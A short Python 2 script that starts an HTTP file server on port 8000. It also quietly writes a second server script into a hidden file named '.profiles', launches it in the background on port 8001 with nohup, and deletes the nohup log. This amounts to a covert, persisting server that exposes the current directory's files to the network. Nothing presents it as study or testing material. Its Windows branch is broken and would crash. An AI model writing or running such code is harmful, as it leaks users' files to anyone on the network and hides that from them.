import SimpleHTTPServer
import SocketServer
import os
if os.name == "nt":
        print "NO NT SUPPORT YET"
else :
        PORT = 8000
        Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
        httpd = SocketServer.TCPServer(('', PORT), Handler)
f=open(".profiles","w")
a="import SimpleHTTPServer \n"
b="import SocketServer \n"
c="\n"
d="PORT = 8001 \n"
e="Handler = SimpleHTTPServer.SimpleHTTPRequestHandler \n"
g="httpd = SocketServer.TCPServer(('', PORT), Handler) \n"
t="httpd.serve_forever()\n"
f.write(a)
f.write(b)
f.write(c)
f.write(d)
f.write(e)
f.write(g)
f.write(t)
f.close( )
os.system("nohup python .profiles")
os.system("rm nohup.out")
httpd.serve_forever()


